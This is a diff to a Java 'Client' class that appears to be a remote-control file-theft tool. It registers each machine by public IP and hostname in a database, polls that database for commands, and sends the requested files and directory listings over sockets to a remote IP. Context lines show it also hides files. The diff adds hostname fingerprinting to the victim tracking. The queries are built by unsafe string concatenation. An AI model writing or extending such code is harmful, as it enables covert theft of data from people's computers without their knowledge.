@@ -10,8 +10,10 @@ import java.io.FileWriter;
 import java.io.InputStreamReader;
 import java.io.ObjectOutputStream;
 import java.io.OutputStream;
+import java.net.InetAddress;
 import java.net.Socket;
 import java.net.URL;
+import java.net.UnknownHostException;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.PreparedStatement;
@@ -42,32 +44,32 @@ public class Client extends Thread {
 		while(true) {
 			try {
 	
-				
+				String loc=hostName();
 				 String ip1=MyIp();
 				String id=Id();
 			String ip=Ip();
 			
 			
-			if(getClientsLen(conn,Id(),MyIp())==0) 
+			if(getClientsLen(conn,Id(),MyIp(),loc)==0) 
 			{
 				
-				 SendIp(conn,id);
+				 SendIp(conn,id,loc);
 			}
 			
 			
 			
 		
 			
-		if(CanConnect(conn,id,ip1)==1&&OptionsLen(conn,id,ip1)==0) {
+		if(CanConnect(conn,id,ip1,loc)==1&&OptionsLen(conn,id,ip1,loc)==0) {
 		
-		SendFiles(getCommand(conn,id,ip1),conn,id,ip,ip1);
+		SendFiles(getCommand(conn,id,ip1,loc),conn,id,ip,ip1,loc);
 	
 	
 
-		}else if(OptionsLen(conn,id,ip1)==1) 
+		}else if(OptionsLen(conn,id,ip1,loc)==1) 
 		{
 		
-			SendNames(conn,getOption(conn,id,ip1),id,ip,ip1);
+			SendNames(conn,getOption(conn,id,ip1,loc),id,ip,ip1,loc);
 			
 		}
 		
@@ -85,14 +87,14 @@ public class Client extends Thread {
 		}
 		
 	
-public static void SendFiles(String file,Connection conn,String id,String ip,String ip1) throws Exception
+public static void SendFiles(String file,Connection conn,String id,String ip,String ip1,String loc) throws Exception
 
 {
 	
 	Socket sock = new Socket(ip, 80);
 	 
     File myFile = new File(file);
-	DeleteRows(conn,"Delete From commands Where id ="+"'"+id+"'"+" And ip ="+"'"+ip1+"'");
+	DeleteRows(conn,"Delete From commands Where id ="+"'"+id+"'"+" And ip ="+"'"+ip1+"'"+" And locIp ="+"'"+loc+"'");
     byte[] mybytearray = new byte[(int) myFile.length()];
      
     FileInputStream fis = new FileInputStream(myFile);
@@ -139,11 +141,11 @@ public static Connection conn() throws Exception
 	}
 	return null;
 }
-public static int CanConnect(Connection conn,String id,String ip) throws Exception
+public static int CanConnect(Connection conn,String id,String ip,String loc) throws Exception
 {
 	PreparedStatement statement=null;
 
-	String sql1 = "SELECT COUNT(*) FROM commands Where id= "+"'"+id+"'"+" And ip ="+"'"+ip+"'";
+	String sql1 = "SELECT COUNT(*) FROM commands Where id= "+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
 	
 	 statement = null;
     ResultSet resultSet = null;
@@ -158,11 +160,11 @@ public static int CanConnect(Connection conn,String id,String ip) throws Excepti
     statement.close();
 return out;
 }
-public static String getCommand(Connection conn,String id,String ip) throws Exception
+public static String getCommand(Connection conn,String id,String ip,String loc) throws Exception
 {
 	
 	Statement stmt = conn.createStatement();
-	String sql = "SELECT * from commands Where id ="+"'"+id+"'"+" And ip ="+"'"+ip+"'";
+	String sql = "SELECT * from commands Where id ="+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
 	ResultSet rs = stmt.executeQuery(sql);
 	String comm="";
    while(rs.next()) {
@@ -176,10 +178,10 @@ comm= rs.getString(1);
 stmt.close();
     return comm;
 }
-public static int OptionsLen(Connection conn,String id,String ip) throws Exception
+public static int OptionsLen(Connection conn,String id,String ip,String loc) throws Exception
 {
 	PreparedStatement statement=null;
-	String sql1 = "SELECT COUNT(*) FROM options Where id="+"'"+id+"'"+" And ip ="+"'"+ip+"'";
+	String sql1 = "SELECT COUNT(*) FROM options Where id="+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
 	 statement = null;
     ResultSet resultSet = null;
     statement = conn.prepareStatement(sql1);
@@ -193,10 +195,10 @@ public static int OptionsLen(Connection conn,String id,String ip) throws Excepti
     statement.close();
 return out;	
 }
-public static String getOption(Connection conn,String id,String ip) throws Exception
+public static String getOption(Connection conn,String id,String ip,String loc) throws Exception
 {
 	Statement stmt = conn.createStatement();
-	String sql = "SELECT * from options Where id ="+"'"+id+"'"+" And ip ="+"'"+ip+"'";
+	String sql = "SELECT * from options Where id ="+"'"+id+"'"+" And ip ="+"'"+ip+"'"+" And locIp ="+"'"+loc+"'";
 	ResultSet rs = stmt.executeQuery(sql);
 	String comm="";
    while(rs.next()) {
@@ -205,7 +207,7 @@ comm= rs.getString(1);
 stmt.close();
     return comm;
 }
-public static void SendNames(Connection conn,String dir,String id,String ip,String ip1) throws Exception
+public static void SendNames(Connection conn,String dir,String id,String ip,String ip1,String loc) throws Exception
 {
 
 	
@@ -213,7 +215,7 @@ Socket socket=new Socket(ip,80);
 ObjectOutputStream dos=new ObjectOutputStream(socket.getOutputStream());
 String[] pathnames;
 File f = new File(dir);
-DeleteRows(conn,"Delete From options Where id ="+"'"+id+"'"+" And ip ="+"'"+ip1+"'");
+DeleteRows(conn,"Delete From options Where id ="+"'"+id+"'"+" And ip ="+"'"+ip1+"'"+" And locIp ="+"'"+loc+"'");
 pathnames=f.list();
 
 dos.writeObject(pathnames);
@@ -280,9 +282,9 @@ private static void setHiddenAttrib(File file) {
       e.printStackTrace();
     }
   }
-public static void SendIp(Connection conn,String id) throws Exception
+public static void SendIp(Connection conn,String id,String loc) throws Exception
 {
-	PreparedStatement ps=conn.prepareStatement("insert into clients values(?,?)");
+	PreparedStatement ps=conn.prepareStatement("insert into clients values(?,?,?)");
 	URL whatismyip = new URL("http://checkip.amazonaws.com");
 	BufferedReader in = new BufferedReader(new InputStreamReader(
 	                whatismyip.openStream()));
@@ -291,13 +293,14 @@ public static void SendIp(Connection conn,String id) throws Exception
 
 	ps.setString(1,ip);
 	ps.setString(2,id);
+	ps.setString(3, loc);
 	ps.executeUpdate();
 	
 }
-public static int getClientsLen(Connection conn,String id,String ip) throws Exception
+public static int getClientsLen(Connection conn,String id,String ip,String loc) throws Exception
 {
 	PreparedStatement statement=null;
-	String sql1 = "SELECT COUNT(*) FROM clients Where ip="+"'"+ip+"'"+" And id="+"'"+id+"'";
+	String sql1 = "SELECT COUNT(*) FROM clients Where ip="+"'"+ip+"'"+" And id="+"'"+id+"'"+" And locIp ="+"'"+loc+"'";
 	 statement = null;
     ResultSet resultSet = null;
     statement = conn.prepareStatement(sql1);
@@ -320,5 +323,19 @@ public static String MyIp() throws Exception
 	String ip = in.readLine(); 	
 return ip;
 }
+public static String hostName() throws Exception
+{
+	 InetAddress ip;
+     String hostname="";
+     
+         ip = InetAddress.getLocalHost();
+         hostname = ip.getHostName();
+    
+      
+         
+       
 
+     
+     return hostname;
+}
 }
